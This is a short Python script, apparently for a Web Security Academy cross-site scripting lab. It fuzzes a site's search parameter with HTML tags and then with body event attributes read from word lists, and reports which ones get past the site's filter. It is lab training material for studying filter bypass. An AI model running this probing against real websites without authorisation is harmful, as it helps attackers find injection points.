#!/usr/bin/python3
import requests

url = "https://target-ac4f1fea1fed5668806d1feb00cf0060.web-security-academy.net/"

def identify_tags():
    with open("tags.txt") as tags:
        all_tags = tags.read().splitlines()
        for tag in all_tags:
            params = {'search': f'<{tag}>'}
            get_req = requests.get(url=url,params=params)
            if "Tag" not in get_req.text:
               print(f"Tag {tag} is allowed :)")

def identify_event():
    ## Since we have identified the right tag, now we should see the attributes that are allowed
     with open("events.txt") as events:
        all_events = events.read().splitlines()
        for event in all_events:
            params = {'search': f'<body {event}>'}
            get_req = requests.get(url=url,params=params)
            if "Attribute" not in get_req.text:
               print(f"Event {event} is allowed :)")

def main():
    #identify_tags()
    identify_event()
if __name__ == '__main__':
    main()
